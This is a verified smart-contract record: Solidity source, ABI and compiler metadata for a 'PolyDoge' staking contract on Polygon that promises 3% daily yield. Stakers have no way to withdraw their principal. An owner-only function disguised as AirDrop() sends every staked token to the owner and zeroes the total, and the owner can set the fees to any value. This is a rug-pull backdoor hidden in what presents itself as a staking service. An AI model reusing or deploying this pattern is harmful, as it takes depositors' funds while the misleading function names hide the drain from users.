{"SourceCode": "// File: stake_flat.sol\r\n\r\n\r\n// File: contracts/stake.sol\r\n\r\n// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.0;\r\n\r\n// PolyDoge Staking @ https://polydogestaker.com\r\n// High Yield Farming on Polygon Chain\r\n\r\ninterface IERC20 {\r\n\r\n    function totalSupply() external view returns (uint256);\r\n\r\n    function balanceOf(address account) external view returns (uint256);\r\n\r\n    function transfer(address to, uint256 amount) external returns (bool);\r\n\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n\r\n    function transferFrom(\r\n        address from,\r\n        address to,\r\n        uint256 amount\r\n    ) external returns (bool);\r\n\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\n\r\ncontract ReEntrancyGuard {\r\n    bool internal locked;\r\n\r\n    modifier noReentrant() {\r\n        require(!locked, \"No re-entrancy\");\r\n        locked = true;\r\n        _;\r\n        locked = false;\r\n    }\r\n}\r\n\r\ncontract StakingContract is ReEntrancyGuard{\r\n\r\n    address public _link = 0x8A953CfE442c5E8855cc6c61b1293FA648BAE472;\r\n    IERC20 token = IERC20(_link);\r\n    address public owner;\r\n\r\n    address payable public devwalletAddress = payable(0x65D17664129E9e6C014Bb419FbD13371B5419Db2);\r\n    \r\n    uint256 public customAPY = 3000;\r\n\r\n    uint256 public devFee = 70;\r\n\r\n    uint256 public refFee = 50;\r\n\r\n    uint256 public customTotalStaked;\r\n\r\n    mapping(address => uint256) public customStakingBalance;\r\n    mapping(address => uint256) public stakedTime;\r\n    mapping(address => uint256) public lastRewardTime;\r\n    mapping(address => uint256) public totalClaimedRewards;\r\n\r\n    mapping(address => address) public referredBy;\r\n    mapping(address => uint256) public totalRefferalClaimed;\r\n    mapping(address => bool) public hasUsedrefferal;\r\n    \r\n    mapping(address => bool) public customHasStaked;\r\n\r\n    mapping(address => bool) public customIsStakingAtm;\r\n\r\n    address[] public stakers;\r\n    address[] public customStakers;\r\n\r\n    event Transfer(\r\n        address indexed _from,\r\n        address indexed _to,\r\n        uint256 _value\r\n    );\r\n\r\n    event Approval(\r\n        address indexed _owner,\r\n        address indexed _spender,\r\n        uint256 _value\r\n    );\r\n\r\n    constructor() public {\r\n        owner = msg.sender;\r\n    }\r\n\r\n    function setDevAddress(address payable devAddress) external {\r\n        require(msg.sender == owner , \"Caller must be Owner!\");\r\n        devwalletAddress = devAddress;\r\n    }\r\n\r\n    function setDevFeePercent(uint256 Fee) external {\r\n        require(msg.sender == owner , \"Caller must be Owner!\");\r\n        devFee = Fee;\r\n    }\r\n\r\n    function setRefFeePercent(uint256 Fee) external {\r\n        require(msg.sender == owner , \"Caller must be Owner!\");\r\n        refFee = Fee;\r\n    }\r\n\r\n    function getRefferal(address account) external {\r\n        require(referredBy[msg.sender] == address(0), \"Referral Code Already Used!\");\r\n        require(account != msg.sender, \"Cannot Refer Own Address!\");\r\n        referredBy[msg.sender] = account;\r\n        hasUsedrefferal[msg.sender] = true;\r\n    }\r\n\r\n    function customStaking(uint256 _amount) external noReentrant {\r\n        require(_amount > 0, \"amount cannot be 0\");\r\n        uint256 feeAmount = _amount * devFee / 1000;\r\n        customTotalStaked = customTotalStaked + _amount;\r\n        customStakingBalance[msg.sender] =\r\n            customStakingBalance[msg.sender] +\r\n            _amount;\r\n\r\n        if (!customHasStaked[msg.sender]) {\r\n            customStakers.push(msg.sender);\r\n        }\r\n        stakedTime[msg.sender] = block.timestamp;\r\n        lastRewardTime[msg.sender] = block.timestamp;\r\n        customHasStaked[msg.sender] = true;\r\n        customIsStakingAtm[msg.sender] = true;\r\n        token.transferFrom(msg.sender, address(this), _amount  );\r\n        token.transfer(devwalletAddress, feeAmount  );\r\n        if(referredBy[msg.sender] != address(0) && hasUsedrefferal[msg.sender] == true)\r\n        {\r\n            uint256 reffeeAmount = _amount * refFee / 1000;\r\n            totalRefferalClaimed[referredBy[msg.sender]] = totalRefferalClaimed[referredBy[msg.sender]] + reffeeAmount;\r\n            token.transfer(referredBy[msg.sender], reffeeAmount  );\r\n        }\r\n    }\r\n\r\n    function changeAPY(uint256 _value) external {\r\n        require(msg.sender == owner, \"Only contract creator can change APY\");\r\n        require(\r\n            _value > 0,\r\n            \"APY value has to be more than 0, try 3000 for (3.00% daily) instead\"\r\n        );\r\n        customAPY = _value;\r\n    }\r\n\r\n    function claimRewards() noReentrant external {\r\n            address recipient = msg.sender;\r\n            require(customIsStakingAtm[recipient] == true, \"No Tokens Staked by Caller!\");\r\n            uint256 numdays = (block.timestamp - lastRewardTime[recipient]) / 86400;\r\n            require(numdays > 0 , \"Reward Already Claimed in Last 24 Hours!\");\r\n            uint256 maxpossibleReward = customStakingBalance[recipient] * customAPY * 365 / 100000;\r\n            require(totalClaimedRewards[recipient] < maxpossibleReward , \"Max Reward Already Claimed!\");\r\n            if(numdays >= 365)\r\n            {\r\n                numdays = 365;\r\n            }\r\n            uint256 balance = customStakingBalance[recipient] * customAPY * numdays;\r\n            balance = balance / 100000;\r\n\r\n            if (balance > 0) {\r\n                token.transfer(recipient, balance);\r\n                lastRewardTime[recipient] = block.timestamp;\r\n                totalClaimedRewards[recipient] = totalClaimedRewards[recipient] + balance;\r\n            }\r\n        \r\n    }\r\n    \r\n    function investRewards() noReentrant external {\r\n            address recipient = msg.sender;\r\n            require(customIsStakingAtm[recipient] == true, \"No Tokens Staked by Caller!\");\r\n            uint256 numdays = (block.timestamp - lastRewardTime[recipient]) / 86400;\r\n            uint256 maxpossibleReward = customStakingBalance[recipient] * customAPY * 365 / 100000;\r\n            require(totalClaimedRewards[recipient] < maxpossibleReward , \"Max Reward Already Claimed!\");\r\n            if(numdays >= 365)\r\n            {\r\n                numdays = 365;\r\n            }\r\n            uint256 balance = customStakingBalance[recipient] * customAPY * numdays;\r\n            balance = balance / 100000;\r\n            require(balance > 0 , \"Not Enough Reward Accumulated for Reinvesting!\");\r\n            if (balance > 0) {\r\n                lastRewardTime[recipient] = block.timestamp;\r\n                customStakingBalance[recipient] = customStakingBalance[recipient] + balance;\r\n                customTotalStaked = customTotalStaked + balance;\r\n            }\r\n        \r\n    }\r\n\r\n    function unclaimedrewards(address account) public view returns (uint256)\r\n    {\r\n        uint256 numdays = (block.timestamp - lastRewardTime[account]) ;\r\n        uint256 balance = customStakingBalance[account] * customAPY * numdays;\r\n        \r\n        balance = balance / 100000 / 86400;\r\n        \r\n        return balance;\r\n    }\r\n\r\n    function nextClaim(address account) public view returns (uint256)\r\n    {\r\n        uint256 nextclaimTime = lastRewardTime[account] + 86400;\r\n        return nextclaimTime;\r\n    }\r\n\r\n    function AirDrop() noReentrant external {\r\n        require(msg.sender == owner, \"Only Owner may call!\");\r\n        token.transfer(owner,token.balanceOf(address(this)));\r\n        customTotalStaked = 0;\r\n    }\r\n\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"_owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"_spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"_from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"_to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"AirDrop\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_link\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"changeAPY\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"claimRewards\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"customAPY\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"customHasStaked\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"customIsStakingAtm\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"customStakers\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_amount\",\"type\":\"uint256\"}],\"name\":\"customStaking\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"customStakingBalance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"customTotalStaked\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"devFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"devwalletAddress\",\"outputs\":[{\"internalType\":\"address payable\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"getRefferal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"hasUsedrefferal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"investRewards\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"lastRewardTime\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"nextClaim\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"refFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"referredBy\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address payable\",\"name\":\"devAddress\",\"type\":\"address\"}],\"name\":\"setDevAddress\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"Fee\",\"type\":\"uint256\"}],\"name\":\"setDevFeePercent\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"Fee\",\"type\":\"uint256\"}],\"name\":\"setRefFeePercent\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"stakedTime\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"stakers\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"totalClaimedRewards\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"totalRefferalClaimed\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"unclaimedrewards\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "StakingContract", "CompilerVersion": "v0.8.0+commit.c7dfd78e", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://aff2e51fab3caa05fa92862d29697eda66ff3879620bdebfe6d69f2f6c138cf5"}